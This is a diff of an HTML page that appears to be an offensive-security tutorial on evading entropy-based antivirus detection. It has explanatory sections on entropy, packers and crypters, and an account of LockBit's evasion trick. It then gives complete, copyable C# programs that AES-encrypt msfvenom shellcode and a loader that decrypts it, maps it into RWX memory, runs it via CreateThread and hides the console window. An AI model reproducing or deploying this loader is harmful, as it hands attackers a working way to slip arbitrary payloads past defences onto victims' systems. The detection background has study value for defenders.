+                    </div>
+                </section>
+                <br>
+                <section class="relative rounded-2xl bg-gradient-to-br from-gray-800 to-gray-900 p-8 overflow-visible shadow-2xl">
+                    <!-- Animated Blob Backdrop -->
+                    <div class="absolute -top-16 -left-16 w-64 h-64 bg-gradient-to-tr from-pink-500 to-purple-600 opacity-20 blur-3xl animate-blob animation-delay-500"></div>
+                    
+                    <div class="relative z-10 text-gray-200">
+                        <h2 class="text-3xl font-extrabold text-white">
+                        How security tools <span class="text-blue-400">evaluate entropy</span>
+                        </h2>
+                        <ol class="list-decimal list-inside pl-5">
+                        <li>
+                            <span class="font-semibold">Slice:</span> Each file into chunks, whole file, per-section (PE headers, .text, .rsrc), or rolling windows of N kB..
+                        </li>
+                        <li>
+                            <span class="font-semibold">Compute:</span> Measure Shannon entropy for each slice.
+                        </li>
+                        <li>
+                            <span class="font-semibold">Compare:</span> Flag slices >7.5 bits/byte (excluding <code class="bg-gray-800 text-green-300 rounded px-1">.text</code>) or feed values into ML models.
+                        </li>
+                        </ol>
+                        <br>
+                        <div class="bg-gray-700 bg-opacity-50 p-6 rounded-xl transform hover:scale-105 transition-transform duration-300">
+                            <p class="leading-relaxed text-gray-300">
+                                Behavioral monitors hook write APIs like 
+                                <code class="bg-gray-800 text-green-300 rounded px-1">NtWriteFile</code> and 
+                                <code class="bg-gray-800 text-green-300 rounded px-1">WriteFileEx</code> to catch high-entropy writes in real time. 
+                                If a process starts saving >7.6-bit data to many files, writes are blocked—mimicking modern anti-ransomware libraries.
+                            </p>
+                        </div>
+                    </div>
+                </section>
+                <br>
+                <section class="relative rounded-2xl bg-gradient-to-br from-gray-800 to-gray-900 p-8 overflow-visible shadow-2xl">
+                    <div class="absolute -bottom-16 -right-16 w-64 h-64 bg-gradient-to-br from-green-400 to-blue-600 opacity-20 blur-3xl animate-blob animation-delay-2000"></div>
+                    <h2 class="text-3xl font-extrabold text-white text-center mb-8">
+                      Typical Entropy Ranges in <span class="text-indigo-400">Clean Files</span>
+                    </h2>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
+                      <div class="relative bg-gray-700 bg-opacity-50 p-6 rounded-2xl shadow-lg overflow-hidden transform hover:scale-105 transition-transform duration-300">
+                        <div class="absolute -top-6 -right-6 w-32 h-32 bg-indigo-500 opacity-20 blur-2xl"></div>
+                        <h3 class="text-lg font-semibold text-white mb-2">Plain Text/Scripts</h3>
+                        <p class="text-indigo-400 font-bold">4.0 – 6.0</p>
+                        <div class="h-2 mt-4 bg-gray-600 rounded-full overflow-hidden">
+                          <div class="h-full bg-indigo-400" style="width:60%"></div>
+                        </div>
+                        <p class="mt-3 text-sm text-gray-300">Highly repetitive ASCII</p>
+                      </div>
+                      <div class="relative bg-gray-700 bg-opacity-50 p-6 rounded-2xl shadow-lg overflow-hidden transform hover:scale-105 transition-transform duration-300">
+                        <div class="absolute -top-6 -right-6 w-32 h-32 bg-purple-500 opacity-20 blur-2xl animation-delay-500"></div>
+                        <h3 class="text-lg font-semibold text-white mb-2">Native Executables: /bin/bash, kernel32.dll</h3>
+                        <p class="text-purple-400 font-bold">6.0 – 7.0</p>
+                        <div class="h-2 mt-4 bg-gray-600 rounded-full overflow-hidden">
+                          <div class="h-full bg-purple-400" style="width:70%"></div>
+                        </div>
+                        <p class="mt-3 text-sm text-gray-300">Code mixed with headers</p>
+                      </div>
+                      <div class="relative bg-gray-700 bg-opacity-50 p-6 rounded-2xl shadow-lg overflow-hidden transform hover:scale-105 transition-transform duration-300">
+                        <div class="absolute -top-6 -right-6 w-32 h-32 bg-teal-500 opacity-20 blur-2xl animation-delay-1000"></div>
+                        <h3 class="text-lg font-semibold text-white mb-2">Compressed archives (ZIP, RAR)</h3>
+                        <p class="text-teal-400 font-bold">7.5 – 7.9</p>
+                        <div class="h-2 mt-4 bg-gray-600 rounded-full overflow-hidden">
+                          <div class="h-full bg-teal-400" style="width:88%"></div>
+                        </div>
+                        <p class="mt-3 text-sm text-gray-300">Flattened byte frequencies</p>
+                      </div>
+                      <div class="relative bg-gray-700 bg-opacity-50 p-6 rounded-2xl shadow-lg overflow-hidden transform hover:scale-105 transition-transform duration-300">
+                        <div class="absolute -top-6 -right-6 w-32 h-32 bg-red-500 opacity-20 blur-2xl animation-delay-1500"></div>
+                        <h3 class="text-lg font-semibold text-white mb-2">Encrypted/Packed Payloads</h3>
+                        <p class="text-red-400 font-bold">7.8 – 8.0</p>
+                        <div class="h-2 mt-4 bg-gray-600 rounded-full overflow-hidden">
+                          <div class="h-full bg-red-400" style="width:98%"></div>
+                        </div>
+                        <p class="mt-3 text-sm text-gray-300">Near-uniform</p>
+                      </div>
+                    </div>
+                  </section>
+                <br>
+                <section class="relative rounded-2xl bg-gradient-to-br from-gray-800 to-black p-8 overflow-visible shadow-2xl">
+                    <div class="absolute -top-16 -left-16 w-64 h-64 bg-gradient-to-tr from-yellow-500 to-orange-1000 opacity-20 blur-3xl animate-blob"></div>
+                    <div class="absolute -bottom-16 -right-16 w-64 h-64 bg-gradient-to-br from-purple-500 to-pink-500 opacity-20 blur-3xl animate-blob animation-delay-2000"></div>
+                    <div class="relative z-10 flex flex-col md:flex-row items-start md:items-center md:space-x-6 space-y-4 md:space-y-0">
+                      <div class="flex-shrink-0">
+                        <svg class="w-12 h-12 text-yellow-400 animate-pulse" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                          <path stroke-linecap="round" stroke-linejoin="round" d="M3 12h18M3 6h18M3 18h18" />
+                        </svg>
+                      </div>
+                      <div class="text-gray-200">
+                        <h2 class="text-2xl font-bold text-white">Compression-Then-Encryption</h2>
+                        <h3 class="text-lg text-yellow-400 mb-2">Beating the Entropy Sensor</h3>
+                        <p class="leading-relaxed">
+                            Static engines often flag any section with near-perfect entropy (~7.9 bits/byte). LockBit sidesteps this by LZ-compressing each victim file before running 
+                            AES-CTR. Compressed data skews entropy downward just enough to dodge the simplest “high entropy” heuristic while still unpacking correctly after decryption.
+                        </p>
+                      </div>
+                    </div>
+                  </section>
+                <br>
+                <div class="relative space-y-6">
+                    <h2 class="text-3xl font-bold text-white">Loader Taxonomy: <span class="text-blue-400">Packers vs. Crypters vs. Protectors</span></h2>
+                    <p class="text-gray-300 leading-relaxed">Malware authors leverage specialized builders to wrap payloads in layers of compression, encryption, and anti-analysis:</p>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                      <div class="relative bg-gray-800 bg-opacity-50 p-6 rounded-2xl shadow-lg transform hover:scale-105 transition duration-300">
+                        <div class="absolute -top-4 -right-4 w-16 h-16 bg-indigo-500 opacity-20 blur-2xl"></div>
+                        <h3 class="text-xl font-semibold text-indigo-300 mb-3">&#9881; Packer</h3>
+                        <p class="text-gray-200 mb-2"><strong>What It Does:</strong> Compresses (optionally encrypts) a payload and self-extracts at runtime.</p>
+                        <p class="text-gray-400 mb-1"><strong>Examples:</strong> UPX, MPRESS, PECompact</p>
+                        <p class="text-gray-400"><strong>Artifacts:</strong> Inflated entry‐point stub; decompression loops in disassembly.</p>
+                      </div>
+                      <div class="relative bg-gray-800 bg-opacity-50 p-6 rounded-2xl shadow-lg transform hover:scale-105 transition duration-300">
+                        <div class="absolute -top-4 -right-4 w-16 h-16 bg-blue-500 opacity-20 blur-2xl animation-delay-500"></div>
+                        <h3 class="text-xl font-semibold text-blue-300 mb-3">&#128274; Crypter</h3>
+                        <p class="text-gray-200 mb-2"><strong>What It Does:</strong> Encrypts with a user-supplied key and adds a runtime decryptor stub.</p>
+                        <p class="text-gray-400 mb-1"><strong>Examples:</strong> ScrubCrypt, CryptOne</p>
+                        <p class="text-gray-400"><strong>Artifacts:</strong> Encrypted <code class="bg-gray-800 text-green-300 rounded px-1">.data</code> section; minimal strings; single AES/RC4 stub.</p>
+                      </div>
+                      <div class="relative bg-gray-800 bg-opacity-50 p-6 rounded-2xl shadow-lg transform hover:scale-105 transition duration-300">
+                        <div class="absolute -top-4 -right-4 w-16 h-16 bg-green-500 opacity-20 blur-2xl animation-delay-1000"></div>
+                        <h3 class="text-xl font-semibold text-green-300 mb-3">&#128737; Protector</h3>
+                        <p class="text-gray-200 mb-2"><strong>What It Does:</strong> Wraps a crypter with VM obfuscation, anti-debug, and integrity checks.</p>
+                        <p class="text-gray-400 mb-1"><strong>Examples:</strong> Themida, VMProtect</p>
+                        <p class="text-gray-400"><strong>Artifacts:</strong> Custom VM bytecode; mangled import tables; heavy anti-analysis tricks.</p>
+                      </div>
+                    </div>
+                  </div>
+                <br>
+                <section class="relative rounded-2xl bg-gray-900 p-10 overflow-visible shadow-2xl mb-8">
+                    <div class="absolute inset-0 bg-gradient-to-br from-gray-800 to-gray-900 opacity-50 rounded-2xl"></div>
+                    <div class="relative z-10">
+                      <h2 class="text-3xl font-bold text-center text-white">
+                        Project Overview:<br>
+                        <span class="text-indigo-400">Encryption, Decryption &amp; Execution</span>
+                      </h2>
+                      <div class="relative pl-12">
+                        <div class="absolute top-0 left-5 h-full border-l-2 border-indigo-400"></div>
+                        <ul class="space-y-5">
+                          <li class="relative">
+                            <div class="absolute -left-7 top-0 w-6 h-6 bg-indigo-400 rounded-full flex items-center justify-center text-gray-900 font-bold">1</div>
+                            <h3 class="text-xl font-semibold text-white">Decrypt the payload</h3>
+                            <p class="text-gray-300 leading-relaxed">
+                              <code class="bg-gray-800 text-green-300 rounded px-1">SmokeScreen()</code> derives a 256-bit key &amp; IV via PBKDF2, then AES-CBC-decrypts <code class="bg-gray-800 text-green-300 rounded px-1">Enc</code> to raw shellcode.
+                            </p>
+                          </li>
+                          <li class="relative">
+                            <div class="absolute -left-7 top-0 w-6 h-6 bg-indigo-400 rounded-full flex items-center justify-center text-gray-900 font-bold">2</div>
+                            <h3 class="text-xl font-semibold text-white">Allocate memory</h3>
+                            <p class="text-gray-300 leading-relaxed">
+                              <code class="bg-gray-800 text-green-300 rounded px-1">VirtualAlloc(..., MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</code> returns <code class="bg-gray-800 text-green-300 rounded px-1">barrel</code>, marked RWX.
+                            </p>
+                          </li>
+                          <li class="relative">
+                            <div class="absolute -left-7 top-0 w-6 h-6 bg-indigo-400 rounded-full flex items-center justify-center text-gray-900 font-bold">3</div>
+                            <h3 class="text-xl font-semibold text-white">Inject shellcode</h3>
+                            <p class="text-gray-300 leading-relaxed">
+                              <code class="bg-gray-800 text-green-300 rounded px-1">Marshal.Copy()</code> moves the decrypted bytes into <code class="bg-gray-800 text-green-300 rounded px-1">barrel</code>.
+                            </p>
+                          </li>
+                          <li class="relative">
+                            <div class="absolute -left-7 top-0 w-6 h-6 bg-indigo-400 rounded-full flex items-center justify-center text-gray-900 font-bold">4</div>
+                            <h3 class="text-xl font-semibold text-white">Launch thread</h3>
+                            <p class="text-gray-300 leading-relaxed">
+                              <code class="bg-gray-800 text-green-300 rounded px-1">CreateThread()</code> starts at <code class="bg-gray-800 text-green-300 rounded px-1">barrel</code>, and <code class="bg-gray-800 text-green-300 rounded px-1">WaitForSingleObject()</code> waits for completion.
+                            </p>
+                          </li>
+                          <li class="relative">
+                            <div class="absolute -left-7 top-0 w-6 h-6 bg-indigo-400 rounded-full flex items-center justify-center text-gray-900 font-bold">5</div>
+                            <h3 class="text-xl font-semibold text-white">Stealth mode</h3>
+                            <p class="text-gray-300 leading-relaxed">
+                              <code class="bg-gray-800 text-green-300 rounded px-1">GetConsoleWindow() + ShowWindow()</code> hides the console before decryption.
+                            </p>
+                          </li>
+                        </ul>
+                      </div>
+                    </div>
+                  </section>
+            </section>
             <br>
-            <div class="flex justify-center">
-                <img src="/images/Enc.png" class="w-80 md:w-96 h-auto" />
-            </div><br>
-            <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">
-                Below are two projects, the 1st one will encrypt your shellcode using AES, while the 2nd does the hard work, it will do:
-                <ol class="list-disc list-outside pl-6 text-gray-300 text-[15px] leading-relaxed sm:text-justify">
-                    <li><strong>Decrypt the payload:</strong>  <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">SmokeScreen()</code> derives a 256-bit key and 128-bit IV from the passphrase with PBKDF2, then AES-CBC-decrypts the byte array (<code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">Enc</code>) to produce raw shellcode.</li>
-                    <li><strong>Allocate executable memory:</strong> <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">VirtualAlloc(..., MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)</code> returns <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">barrel</code>, a buffer large enough for the shellcode and already marked <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">RWX</code>.</li>
-                    <li><strong>Copy the shellcode into that buffer:</strong> <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">Marshal.Copy()</code>moves the decrypted bytes into <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">barrel</code>.</li>
-                    <li><strong>Create a new thread that starts at the buffer:</strong> <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">CreateThread()</code> sets the thread’s start address to <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">barrel; WaitForSingleObject()</code> blocks the current thread until execution ends.</li>
-                    <li><strong>Hide the console window:</strong> <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">GetConsoleWindow() + ShowWindow()</code> runs before decryption to keep the process silent.</li>
-                </ol>
-            </p>
+            <section class="relative rounded-2xl bg-gray-900 p-8 overflow-visible shadow-2xl">
+                <!-- Animated Blob Accent -->
+                <div class="absolute -bottom-16 -right-16 w-72 h-72 bg-gradient-to-br from-green-400 to-blue-600 opacity-30 blur-3xl animate-blob animation-delay-2000"></div>
+                <div class="relative space-y-6">
+                  <h2 class="text-3xl font-bold text-white">
+                    C# project: <span class="text-blue-400">Encryption &amp; Decryption</span>
+                  </h2>
+                  <details class="bg-gray-800 bg-opacity-50 p-4 rounded-lg group">
+                    <summary class="flex items-center justify-between text-xl font-semibold text-pink-400 cursor-pointer">
+                      <span>Encryption Project</span>
+                      <svg class="w-6 h-6 transform transition-transform duration-200 group-open:rotate-180 text-pink-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+                      </svg>
+                    </summary>
+                    <div class="mt-4 relative">
+                      <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
+                      <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner">
+                        <code class="language-csharp text-green-300">
+                        using System.Security.Cryptography;
+                        using System.IO;
+                        using System.Text;
+                        using System;
+        
+                        public class ENC
+                        {
+                            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+                            {
+                                byte[] encryptedBytes = null;
+                                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
+                                using (MemoryStream ms = new MemoryStream())
+                                {
+                                    using (RijndaelManaged AES = new RijndaelManaged())
+                                    {
+                                        AES.KeySize = 256;
+                                        AES.BlockSize = 128;
+                                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                                        AES.Key = key.GetBytes(AES.KeySize / 8);
+                                        AES.IV = key.GetBytes(AES.BlockSize / 8);
+                                        AES.Mode = CipherMode.CBC;
+                                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                                        {
+                                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                                            cs.Close();
+                                        }
+                                        encryptedBytes = ms.ToArray();
+                                    }
+                                }
+                                return encryptedBytes;
+                            }
+                            public static void PrintShellcode(byte[] shellcodeBytes)
+                            {
+                                StringBuilder shellcode = new StringBuilder();
+                                shellcode.Append("byte[] Enc = new byte[");
+                                shellcode.Append(shellcodeBytes.Length);
+                                shellcode.Append("] { ");
+                                for (int i = 0; i < shellcodeBytes.Length; i++)
+                                {
+                                    shellcode.Append("0x");
+                                    shellcode.AppendFormat("{0:x2}", shellcodeBytes[i]);
+                                    if (i < shellcodeBytes.Length - 1)
+                                    {
+                                        shellcode.Append(",");
+                                    }
+                                }
+                                shellcode.Append(" };");
+                                Console.WriteLine(shellcode.ToString());
+                            }
+                            public static void Main(string[] args)
+                            {
+                                //msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
+                                byte[] buf = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
+                                0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
+                                0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
+                                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
+                                0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
+                                0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
+                                0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
+                                0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
+                                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
+                                0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
+                                0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
+                                0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
+                                0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
+                                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
+                                0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
+                                0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
+                                0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
+                                0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
+                                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
+                                0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
+                                0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
+                                0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
+                                0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
+                                0x63,0x2e,0x65,0x78,0x65,0x00};
+        
+                                byte[] key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("MyK3yG0o0zH3r3")); // Change Password if needed
+                                byte[] shellcodeEncrypted = AES_Encrypt(buf, key);
+                                PrintShellcode(shellcodeEncrypted);
+                            }
+                        }
+                        </code>
+                      </pre>
+                    </div>
+                  </details>
+                  <details class="bg-gray-800 bg-opacity-50 p-4 rounded-lg group">
+                    <summary class="flex items-center justify-between text-xl font-semibold text-pink-400 cursor-pointer">
+                      <span>Decryption Project</span>
+                      <svg class="w-6 h-6 transform transition-transform duration-200 group-open:rotate-180 text-pink-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+                      </svg>
+                    </summary>
+                    <div class="mt-4 relative">
+                      <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
+                      <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner">
+                        <code class="language-csharp text-green-300">
+                            using System;
+                            using System.IO;
+                            using System.Runtime.InteropServices;
+                            using System.Security.Cryptography;
+                            using System.Text;
+            
+                            namespace AppDomainInvasion
+                            {
+                                class Revolver
+                                {
+                                    [DllImport("kernel32.dll", SetLastError = true)]
+                                    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint Size, uint flAllocationType, uint flProtect);
+                                    [DllImport("kernel32.dll")]
+                                    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+                                    [DllImport("kernel32.dll")]
+                                    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+                                    [DllImport("kernel32.dll")]
+                                    static extern IntPtr GetConsoleWindow();
+                                    [DllImport("user32.dll")]
+                                    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+                                    [DllImport("kernel32.dll")]
+                                    static extern void Sleep(uint dwMilliseconds);
+                                    public static byte[] SmokeScreen(byte[] rifle, byte[] ammo)
+                                    {
+                                        byte[] bullets = null;
+                                        byte[] powder = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
+                                        using (MemoryStream magazine = new MemoryStream())
+                                        {
+                                            using (RijndaelManaged smoke = new RijndaelManaged())
+                                            {
+                                                smoke.KeySize = 256;
+                                                smoke.BlockSize = 128;
+                                                var clip = new Rfc2898DeriveBytes(ammo, powder, 1000);
+                                                smoke.Key = clip.GetBytes(smoke.KeySize / 8);
+                                                smoke.IV = clip.GetBytes(smoke.BlockSize / 8);
+                                                smoke.Mode = CipherMode.CBC;
+                                                using (var target = new CryptoStream(magazine, smoke.CreateDecryptor(), CryptoStreamMode.Write))
+                                                {
+                                                    target.Write(rifle, 0, rifle.Length);
+                                                    target.Close();
+                                                }
+                                                bullets = magazine.ToArray();
+                                            }
+                                        }
+                                        return bullets;
+                                    }
+                                    public static void Fire(byte[] round)
+                                    {
+                                        IntPtr barrel = VirtualAlloc(IntPtr.Zero, (UInt32)round.Length, 0x3000, 0x40);
+                                        Marshal.Copy(round, 0, barrel, round.Length);
+                                        IntPtr trigger = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                                        IntPtr hammer = IntPtr.Zero;
+                                        hammer = CreateThread(IntPtr.Zero, 0, barrel, IntPtr.Zero, 0, IntPtr.Zero);
+                                        WaitForSingleObject(hammer, 0xFFFFFFFF);
+                                    }
+                                    public static void Execute()
+                                    {
+                                        var lockup = GetConsoleWindow();
+                                        ShowWindow(lockup, 0);
+                                        //Change this with your encryption data
+                                        byte[] Enc = new byte[288] {
+                                            0x4f, 0xb4, 0xe8, 0xf9, 0xa5, 0xde, 0x46, 0x48, 0x31, 0xd3, 0xc2, 0x22, 0xb8, 0x36, 0x7f, 
+                                            0xb8, 0xc1, 0x1f, 0x1f, 0x40, 0x86, 0x66, 0x7d, 0x7f, 0x15, 0xe0, 0x34, 0x3e, 0x31, 0x9a, 
+                                            0xb9, 0x75, 0xca, 0xae, 0xed, 0x70, 0xa3, 0x4d, 0x5c, 0x89, 0x00, 0x85, 0xc3, 0x7a, 0xe6, 
+                                            0xec, 0x1c, 0x8f, 0x35, 0x66, 0xec, 0x4f, 0xbc, 0xaa, 0xce, 0xb7, 0xbd, 0x94, 0x6e, 0x19, 
+                                            0x1f, 0xd2, 0xdf, 0x4e, 0xb3, 0x22, 0x70, 0x1d, 0x6b, 0xa3, 0x3b, 0x4a, 0x9b, 0xa0, 0x26, 
+                                            0x74, 0xe2, 0xd0, 0xed, 0x79, 0x34, 0xd2, 0x09, 0xc2, 0x48, 0x36, 0xf1, 0x0c, 0x5e, 0x64, 
+                                            0xca, 0xc3, 0xed, 0x17, 0xca, 0x8b, 0x32, 0x96, 0xc7, 0xcc, 0x7c, 0xcb, 0x4c, 0xcd, 0x15, 
+                                            0x53, 0x03, 0x09, 0xe4, 0x38, 0x40, 0x2d, 0x80, 0x66, 0xa1, 0x31, 0xda, 0x28, 0x42, 0x4a, 
+                                            0xad, 0x34, 0xba, 0x49, 0xa9, 0x46, 0x61, 0x01, 0x59, 0x7b, 0x10, 0x11, 0x0c, 0x81, 0x09, 
+                                            0x3c, 0x1c, 0x1a, 0xfe, 0xc8, 0xa9, 0x85, 0x3d, 0x6a, 0x30, 0xb5, 0x81, 0xb2, 0x3e, 0xd1, 
+                                            0x77, 0x11, 0x5e, 0xac, 0x5e, 0x3a, 0x71, 0x97, 0x19, 0x24, 0xf2, 0xf3, 0xa4, 0x86, 0x5d, 
+                                            0x1c, 0x0c, 0x5a, 0xd5, 0xae, 0x5d, 0xff, 0x53, 0x05, 0xe4, 0xa1, 0x96, 0xdd, 0x22, 0x6e, 
+                                            0xa8, 0x17, 0x25, 0xc3, 0x25, 0xb9, 0xde, 0xd3, 0xe2, 0x76, 0xa5, 0x0f, 0x85, 0x91, 0x2e, 
+                                            0xd9, 0xd9, 0xba, 0x00, 0x0f, 0x92, 0x97, 0x04, 0x25, 0x89, 0x27, 0x31, 0xbb, 0xe3, 0x81, 
+                                            0x4d, 0xaa, 0x63, 0x78, 0xc3, 0x58, 0x76, 0x9a, 0x24, 0xf6, 0xb9, 0xb4, 0x1e, 0x92, 0x7a, 
+                                            0xdb, 0xe5, 0xd5, 0xaa, 0xd0, 0xbc, 0xec, 0xbc, 0xd5, 0x82, 0xef, 0x0c, 0xec, 0x85, 0x05, 
+                                            0x7b, 0xcf, 0xf2, 0xfe, 0xc7, 0xa8, 0x9f, 0xb9, 0xe5, 0x3d, 0xc9, 0xf7, 0xff, 0x72, 0xef, 
+                                            0xc1, 0x56, 0x44, 0x40, 0xd4, 0x8d, 0x21, 0x19, 0x07, 0xe0, 0x05, 0x09, 0x6f, 0x94, 0x63, 
+                                            0xcf, 0x85, 0x86, 0x03, 0x95, 0x13, 0x2b, 0x14, 0xc6, 0x1c, 0x82, 0x31, 0x34, 0xdd, 0x33, 
+                                            0x9a, 0xd5, 0x72 };
+            
+                                        byte[] gunpowder = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("MyK3yG0o0zH3r3")); //Change this
+                                        Enc = SmokeScreen(Enc, gunpowder);
+                                        Fire(Enc);
+            
+                                    }
+                                    public static void Main(string[] args)
+                                    {
+                                        Execute();
+                                    }
+                                }
+                            }
+                        </code>
+                      </pre>
+                    </div>
+                  </details>
+                </div>
+            </section>
             <style>
-                pre 
-                {
-                  background-color: #334155;
-                  color: #dcdcdc;
-                  font-family: Consolas, monospace;
-                  overflow-x: auto;
-                  position: relative;
-                }              
                 .copy-button 
                 {
                   position: absolute;
@@ -254,20 +663,8 @@
                 {
                   background-color: #3b82f6;
                 }              
-                summary    
-                {
-                font-size: 1.1em;
-                font-weight: bold;
-                cursor: pointer;
-                padding: 0.4rem 0.6rem;  /* reduce padding here */
-                }         
-                details 
-                {
-                  position: relative;
-                  margin-bottom: 0.25rem;  /* or 0 */
-                }
               </style>
-              <script>
+            <script>
                 function copyCode(button) {
                   const codeBlock = button.parentElement.querySelector('code');
                   const text = codeBlock.textContent;
@@ -279,184 +676,13 @@
                     }, 1500);
                   });
                 }
-              </script>                 
-            <details>
-                <summary class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">C# AES Encryption Project</summary>
-                <pre>
-                <button class="copy-button" onclick="copyCode(this)">Copy</button>
-                <code class="language-csharp">                    
-                using System.Security.Cryptography;
-                using System.IO;
-                using System.Text;
-                using System;
-
-                public class ENC
-                {
-                    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
-                    {
-                        byte[] encryptedBytes = null;
-                        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
-                        using (MemoryStream ms = new MemoryStream())
-                        {
-                            using (RijndaelManaged AES = new RijndaelManaged())
-                            {
-                                AES.KeySize = 256;
-                                AES.BlockSize = 128;
-                                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
-                                AES.Key = key.GetBytes(AES.KeySize / 8);
-                                AES.IV = key.GetBytes(AES.BlockSize / 8);
-                                AES.Mode = CipherMode.CBC;
-                                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
-                                {
-                                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
-                                    cs.Close();
-                                }
-                                encryptedBytes = ms.ToArray();
-                            }
-                        }
-                        return encryptedBytes;
-                    }
-                    public static void PrintShellcode(byte[] shellcodeBytes)
-                    {
-                        StringBuilder shellcode = new StringBuilder();
-                        shellcode.Append("byte[] Enc = new byte[");
-                        shellcode.Append(shellcodeBytes.Length);
-                        shellcode.Append("] { ");
-                        for (int i = 0; i < shellcodeBytes.Length; i++)
-                        {
-                            shellcode.Append("0x");
-                            shellcode.AppendFormat("{0:x2}", shellcodeBytes[i]);
-                            if (i < shellcodeBytes.Length - 1)
-                            {
-                                shellcode.Append(",");
-                            }
-                        }
-                        shellcode.Append(" };");
-                        Console.WriteLine(shellcode.ToString());
-                    }
-                    public static void Main(string[] args)
-                    {
-                        //msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
-                        byte[] buf = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
-                        0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
